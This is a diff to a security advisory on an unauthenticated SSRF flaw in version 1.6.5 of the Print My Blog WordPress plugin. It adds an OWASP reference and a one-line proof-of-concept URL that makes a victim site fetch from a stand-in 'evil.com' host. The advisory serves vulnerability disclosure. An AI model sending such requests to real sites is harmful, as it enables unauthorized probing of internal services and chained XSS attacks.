@@ -20,13 +20,19 @@ SSRF in 'print my blog' wordpress plugin
 
 Title says it all - unauthenticated Server Side Request Forgery
 (SSRF) vulnerability in the Print My Blog[1] version 1.6.5 and
-probably earlier as well.
+probably earlier as well. A general description of SSRF can be
+found on OWASP's wiki[4].
 
 The wp_remote_get()[2] function gets called with an attacker
 controllable URL, resulting in unauthenticated SSRF. By setting
 up a malicious web server, the SSRF can be further chained to
 launch a reflected XSS attack. I'll leave it up to the reader
 to figure out how. 
+
+# Proof of Concept Exploit
+
+The issue can be triggered by browsing:
+http://victim.com/?print-my-blog=1&site=http://evil.com/
 
 
 includes/controllers/PmbFrontend.php:
@@ -121,6 +127,7 @@ https://twitter.com/magnusstubman/status/1121734829878513665
 1: https://wordpress.org/plugins/print-my-blog
 2: https://developer.wordpress.org/reference/functions/wp_remote_get/
 3: https://plugins.trac.wordpress.org/changeset?old_path=%2Fprint-my-blog&old=2055705&new_path=%2Fprint-my-blog&new=2075775&sfp_email=&sfph_mail=#file6
+4: https://www.owasp.org/index.php/Server_Side_Request_Forgery
 
 
 
